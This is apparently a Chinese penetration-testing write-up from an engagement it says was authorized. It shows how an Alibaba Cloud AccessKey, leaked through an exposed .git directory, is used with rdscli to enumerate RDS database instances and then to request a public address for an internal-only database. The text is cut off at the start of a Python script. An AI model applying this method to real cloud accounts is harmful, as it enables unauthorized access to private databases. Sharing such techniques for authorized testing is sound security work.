## 前言
在某次和地方组织前期渗透侦查中(已授权),
通过/.git/获取到网站源码，查看配置文件发现该系统使用OSS进行文件存储,但是网站迟迟shell不下。通过.git对文件进行恢复，得到信息如下：  
1.网站部分源码，但是审计相当耗时。  
2.查看配置文件发现数据库采用阿里云RDS，且阿里云RDS为内网地址。  
3.网站对文件上传采用OSS进行文件存储。
如果是你，shell拿不到，RDS仅对内，3306端口不通，SQL注入，RCE等常见漏洞又没有，改怎么办?
## 信息收集
配置信息如下：
    ACCESSKEYID=XXXXX
    ACCESSKEYSECRET=XXXXX
    ENDPOINT=oss-cn-beijing.aliyuncs.com
    DB_HOST=rm-xxxxx.mysql.rds.aliyuncs.com
    DB_PORT=3306
    DB_USER=xxxx
    DB_PASSWORD=xxxxx
之前了解过，通过KEYID（非子账户）,可以获取到阿里云的服务器权限，例如某些运维平台支持类似这种使用。
但是这些服务器的密码并不知道，及时知道，大部分服务器VPC对外仅开了80，443，而且异地登录会发送告警，这样的方法不可取。
## 利用方式
获取到MYSQL，但是通过ping，可以看到实际上是一个内网IP，其实服务器是在一个VPC里，也就是数据库只允许内网来链接，这样我们怎么办呢，可能都束手无策了吧。
主要需要分析数据，但是RDS并不允许连接。查询阿里云相关文件，发现RDS其实也可以使用ACCESSKEY来进行操作的。
通过阿里云官网，可以下载工具Rdscli
查看相关文档，配置就不再次啰嗦了，文档里面都包含：
通过key查看账户下RDS相关实例：
    rds DescribeDBInstances --PageSize 50
返回如下：
    [root@localhost Rdscli]# rds DescribeDBInstances --PageSize 50
    ----------------------------------------------------------------------------------------    |                     DescribeDBInstances                                                    |
    +-------------------+----------------------------------------------------------------+
    |  PageNumber               |  1                                                              |
    |  PageRecordCount       |  6                                                               |
    |  RequestId                  |  XXXXXXXX-XXXX-4A0B-97C1-C5XXXXXXXXXX |
    |  TotalRecordCount      |  6                                                                |
    +-------------------+-----------------------------------------------------------------+
    ||                           Items                                                                  ||
    |+-----------------------------------------------------------------------------------+|
    |||                             DBInstance                                                    |||
    ||+-------------------------+-----------------------------------------------------+||
    |||  ConnectionMode            |  Standard                                          |||
    |||  CreateTime                   |  2020-08-14T12:46:23Z                      |||
    |||  DBInstanceClass             |     rds.mysql.s3.large                         |||
    |||  DBInstanceDescription   |  rr-XXXXXXXXXXXXXXXXX                     |||
    |||  DBInstanceId                 |  rr-XXXXXXXXXXXXXXXXX                     |||
    |||  DBInstanceNetType       |  Intranet                                            |||
    |||  DBInstanceStatus           |  Running                                            |||
    |||  DBInstanceStorageType  |                                                         |||
    |||  DBInstanceType             |  Readonly                                          |||
    |||  Engine                           |  MySQL                                              |||
    |||  EngineVersion                |  8.0                                                   |||
    |||  ExpireTime                    |  2020-10-14T16:00:00Z                       |||
    |||  InsId                              |  1                                                      |||
    |||  InstanceNetworkType     |  VPC                                                  |||
    |||  LockMode                      |  Unlock                                               |||
    |||  LockReason                   |                                                           |||
    |||  MasterInstanceId            |  rm-XXXXXXXXXXXXXXXXX                   |||
    |||  MutriORsignle                |  False                                                 |||
    |||  PayType                        |  Prepaid                                             |||
    |||  RegionId                        |  cn-beijing                                         |||
    |||  ResourceGroupId           |  rg-XXXXXXXXXXXXXXX                         |||
    |||  VSwitchId                      |  vsw-XXXXXXXXXXXXXXXXXXXXX           |||
    |||  VpcCloudInstanceId       |  rr-XXXXXXXXXXXXXXXXX                     |||
    |||  VpcId                            |  vpc-XXXXXXXXXXXXXXXXXXXXX           |||
    |||  ZoneId                          |      cn-beijing-h                                   |||
    ||+--------------------------------+------------------------------------------------+||
通过工具获取实例ID，查看某个实例信息：
    rds ExportDBInstance --DBInstanceId rr-XXXXXXX  --filename test
返回实例详细信息：
    {
        "Items": {
            "DBInstanceAttribute": [
                {
                    "Category": "HighAvailability",
                    "SupportUpgradeAccountType": "No",
                    "InsId": 1,
                    "LockMode": "Unlock",
                    "ConnectionString": "rr-xxxxxxxxxx.mysql.rds.aliyuncs.com",
                    "MasterInstanceId": "rm-xxxxxxxxxxxx",
                    "DBInstanceStorageType": "local_ssd",
                    "DBInstanceNetType": "Intranet",
                    "ReadDelayTime": "0",
                    "ReadOnlyDBInstanceIds": {
                        "ReadOnlyDBInstanceId": []
                    },
                    "SupportCreateSuperAccount": "No",
                    "MaxConnections": 2000,
                    "DBInstanceClassType": "x",
                    "Engine": "MySQL",
                    "AvailabilityValue": "100.0%",
                    "CanTempUpgrade": true,
                    "VpcId": "vpc-xxxxxxxxxxx",
                    "IPType": "IPv4",
                    "DBMaxQuantity": 99999,
                    "ConnectionMode": "Standard",
                    "RegionId": "cn-beijing",
                    "SlaveZones": {
                        "SlaveZone": []
                    },
                    "ResourceGroupId": "rg-xxxx",
                    "VSwitchId": "vsw-xxxxxx",
                    "InstanceNetworkType": "VPC",
                    "ExpireTime": "2020-10-14T16:00:00Z",
                    "ConsoleVersion": "",
                    "DBInstanceType": "Readonly",
                    "DBInstanceStatus": "Running",
                    "ProxyType": 0,
                    "DispenseMode": "ClassicDispenseMode",
                    "CreationTime": "2020-08-14T12:46:23Z",
                    "SecurityIPMode": "normal",
                    "SuperPermissionMode": "",
                    "AutoUpgradeMinorVersion": "Auto",
                    "EngineVersion": "8.0",
                    "CurrentKernelVersion": "rds_20200630",
                    "DBInstanceDiskUsed": 67697115136,
                    "IncrementSourceDBInstanceId": "rm-xxxxxxx",
                    "VpcCloudInstanceId": "rr-xxxxxxx",
                    "DBInstanceMemory": 8192,
                    "MaxIOPS": 5000,
                    "DedicatedHostGroupId": "",
                    "DBInstanceStorage": 100,
                    "DBInstanceDescription": "rr-xxxxxxx",
                    "Extra": {
                        "DBInstanceIds": {
                            "DBInstanceId": []
                        }
                    },
                    "LatestKernelVersion": "rds_20200630",
                    "DBInstanceId": "rr-xxxxxxxxxxxx",
                    "PayType": "Prepaid",
                    "AccountMaxQuantity": 99999,
                    "OriginConfiguration": "",
                    "MaintainTime": "18:00Z-22:00Z",
                    "DBInstanceCPU": "4",
                    "AccountType": "Mix",
                    "DBInstanceClass": "rds.mysql.s3.large",
                    "SecurityIPList": "",
                    "Port": "3306",
                    "ZoneId": "cn-beijing-h"
                }
            ]
        },
        "RequestId": "A1A4E351-1778-xxxx-9D57-xxxxxxx"
然后我自己在阿里云注册了一个看看RDS平台提供的功能：
注册发现，实际上RDS分为内网域名和外网域名的，默认是不开外网地址的，需要自己去申请，查看的RDS ConnectionString
很明显是一个内网的地址。
查询官方API，发现有支持此功能的API：
调用AllocateInstancePublicConnection接口申请实例的外网地址
申请外网地址代码如下：
    #!/usr/bin/env python
    #coding=utf-8
    from aliyunsdkcore.client import AcsClient
    from aliyunsdkcore.acs_exception.exceptions import ClientException
    from aliyunsdkcore.acs_exception.exceptions import ServerException